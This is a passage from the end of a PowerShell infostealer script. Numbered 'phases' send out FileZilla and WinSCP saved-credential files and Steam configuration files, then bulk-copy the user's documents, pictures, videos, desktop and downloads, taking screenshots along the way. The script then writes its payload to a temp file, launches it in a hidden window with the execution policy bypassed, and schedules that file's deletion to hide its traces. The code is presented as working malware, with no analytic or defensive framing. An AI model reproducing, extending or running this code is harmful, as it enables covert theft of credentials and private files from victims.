# ========== PHASE 17g: FTP/SCP TOOLS ==========
Send-Text '===PHASE17g:FTP/SCP TOOLS==='
try{
$fzPath = "$env:APPDATA\FileZilla\sitemanager.xml"
if (Test-Path $fzPath) { Send-Text 'FILEZILLA:FOUND'; Send-File $fzPath } else { Send-Text 'FILEZILLA:NO' }
}catch{Send-Text 'FILEZILLA_ERR:'+$_.Exception.Message}

try{
$winscpPath = "$env:APPDATA\WinSCP\WinSCP.ini"
if (Test-Path $winscpPath) { Send-Text 'WINSCP:FOUND'; Send-File $winscpPath } else { Send-Text 'WINSCP:NO' }
}catch{Send-Text 'WINSCP_ERR:'+$_.Exception.Message}

Capture-Screen 'CREDENTIALS2'

# ========== PHASE 18: GAME LAUNCHERS ==========
Send-Text '===PHASE18:GAME LAUNCHERS==='
$r9=@()
$r9+='===STEAM==='
try{
$st=$env:USERPROFILE+'\Documents\My Games'
if(Test-Path $st){$r9+='FOUND MY GAMES'}
$stm='C:\Program Files (x86)\Steam'
if(Test-Path $stm){$r9+='FOUND STEAM INSTALL';Exfil ($env:USERPROFILE+'\Documents\My Games') @('.vdf','.ini','.cfg') 'STEAM' 10}
else{$r9+='NO STEAM'}
}catch{$r9+='ERR:'+$_.Exception.Message}
$gamer=$env:TEMP+'\recon_games.txt'
$r9|Out-File -FilePath $gamer -Encoding UTF8
Send-File $gamer
Remove-Item $gamer -Force

# ========== PHASE 19: FILE EXFILTRATION ==========
Send-Text '===PHASE19:FILE EXFILTRATION==='
Exfil ($env:USERPROFILE+'\Documents') @('.txt','.pdf','.docx','.xlsx','.doc','.pptx','.csv','.rtf') 'DOCUMENTS' $m
Exfil ($env:USERPROFILE+'\Pictures') @('.jpg','.jpeg','.png','.gif','.bmp','.webp','.tiff') 'PICTURES' $m
Exfil ($env:USERPROFILE+'\Videos') @('.mp4','.avi','.mov','.mkv','.wmv','.flv','.webm') 'VIDEOS' $m
Exfil ($env:USERPROFILE+'\Desktop') @('.txt','.pdf','.docx','.xlsx','.jpg','.jpeg','.png','.zip','.exe','.ps1') 'DESKTOP' $m
Exfil ($env:USERPROFILE+'\Downloads') @('.exe','.msi','.zip','.rar','.7z','.iso') 'DOWNLOADS' $m

Capture-Screen 'FINAL'

Send-Text '===COMPLETE==='
Send-Text 'DONE'

'@
$tp=$env:TEMP+'\t.ps1'
$pl|Out-File -FilePath $tp -Encoding UTF8 -Force
# Start main payload hidden
Start-Process powershell -WindowStyle Hidden -ArgumentList @('-ExecutionPolicy','Bypass','-File',$tp)
# Start cleanup process (waits 5 min then deletes temp file)
$clean="Start-Sleep 300; Remove-Item '"+$tp+"' -Force -ErrorAction SilentlyContinue"
Start-Process powershell -WindowStyle Hidden -ArgumentList @('-Command',$clean)
exit
}